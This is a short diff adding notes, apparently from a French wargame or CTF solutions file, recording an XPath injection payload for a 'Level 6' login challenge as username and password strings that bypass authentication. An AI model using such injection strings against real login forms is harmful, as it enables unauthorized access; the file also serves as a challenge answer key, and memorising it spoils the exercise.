@@ -269,6 +269,9 @@ le filtre supprime les balises.
 username : a from 127.0.0.1\n
 
 ##Level 6
+XPATH injection
+username : ' or realname/text()='Sandra Murphy
+password : ' or realname/text()='Sandra Murphy
 
 #Javascript
 ##Level 1
